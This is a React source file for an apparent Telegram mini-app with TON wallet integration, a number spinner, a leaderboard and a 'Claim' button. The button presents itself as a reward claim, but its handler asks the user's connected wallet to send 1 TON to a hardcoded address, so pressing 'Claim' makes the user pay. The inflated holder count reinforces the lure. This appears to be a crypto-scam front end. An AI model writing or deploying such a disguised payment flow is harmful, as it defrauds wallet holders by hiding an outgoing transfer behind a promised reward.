import { Button, Stack, Typography } from "@mui/material";
import { useEffect, useState } from "react";
import {
  useTonAddress,
  // useTonWallet,
  TonConnectButton,
  useTonConnectUI
} from "@tonconnect/ui-react";

import { CatIcon, HomeIcon, LeaderIcon } from "./icons.js";
import { LeaderItem } from "./LeaderItem.jsx";
import { leaders } from "./constants.js";
import { NumberSpinner } from "./NumberSpinner.js";

const TG = window.Telegram.WebApp;

export const App = () => {
  const rawAddress = useTonAddress(false);

  const [screen, setScreen] = useState("Home");
  const [claim, setClaim] = useState(false);
  const changeScreen = (screen) => {
    setScreen(screen);
  };

  const [tonConnectUI] = useTonConnectUI();

  const sendTransaction = async () => {
    try {
      const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 3600, // 1 hour expiration
        messages: [
          {
            address: "UQBNywGlFc8qWr-Y2X60ggaZAM_ZdkWX6PA3-tcyUx9NEbbn",
            amount: String(Math.round(Number(1) * 1000000000))
          }
        ]
      };

      await tonConnectUI.sendTransaction(transaction);
      console.log("Transaction sent successfully");
    } catch (error) {
      console.error("Failed to send transaction:", error);
    }
  };

  useEffect(() => {
    TG.expand();
  }, []);

  return (
    <Stack sx={{ backgroundColor: "white", padding: "10px", height: "100vh" }}>
      <Stack direction="row" alignItems="center" justifyContent="space-between" gap="20px">
        <Typography sx={{ color: "black" }}>{TG?.initDataUnsafe?.user?.username}</Typography>
        {rawAddress ? (
          <Button
            variant="contained"
            size="small"
            sx={{ overflow: "hidden", whiteSpace: "nowrap", textOverflow: "ellipsis" }}
          >
            Connected
          </Button>
        ) : (
          <TonConnectButton />
        )}
      </Stack>
      <Stack direction="row" gap="30px" alignContent="center" justifyContent="center">
        <Stack
          alignContent="center"
          alignItems="center"
          onClick={() => changeScreen("Home")}
          sx={{ cursor: "pointer" }}
        >
          <HomeIcon />
          <Typography sx={{ fontSize: "15px", fontWeight: "600" }}>Home</Typography>
        </Stack>
        <Stack
          alignContent="center"
          alignItems="center"
          onClick={() => changeScreen("Leaderboard")}
          sx={{ cursor: "pointer" }}
        >
          <LeaderIcon />
          <Typography sx={{ fontSize: "15px", fontWeight: "600" }}>Leaderboard</Typography>
        </Stack>
      </Stack>
      <Stack sx={{ overflow: "hidden" }}>
        {screen === "Home" && (
          <Stack alignItems="center">
            <Stack>
              <CatIcon sx={{ width: "170px", height: "170px" }} />
            </Stack>
            <Stack direction="row" alignItems="center">
              <NumberSpinner claim={() => setClaim(true)} />
            </Stack>

            {claim && rawAddress ? (
              <Stack>
                <Button variant="contained" onClick={sendTransaction} disabled={!claim}>
                  Claim
                </Button>
              </Stack>
            ) : (
              <Typography sx={{ fontSize: "30px", fontWeight: "600", marginLeft: "15px" }}>
                Connect wallet to claim
              </Typography>
            )}
          </Stack>
        )}
        {screen === "Leaderboard" && (
          <Stack sx={{ padding: "20px" }}>
            <Stack direction="row" justifyContent="space-between">
              <Typography sx={{ fontWeight: "600" }}>25,720,602 holders</Typography>
              <Typography sx={{ opacity: "0.5" }}> (Top 100)</Typography>
            </Stack>
            <Stack sx={{ height: "75vh", overflow: "scroll" }}>
              {leaders.map((leader, idx) => (
                <LeaderItem leader={leader} idx={idx} />
              ))}
            </Stack>
          </Stack>
        )}
      </Stack>
    </Stack>
  );
};
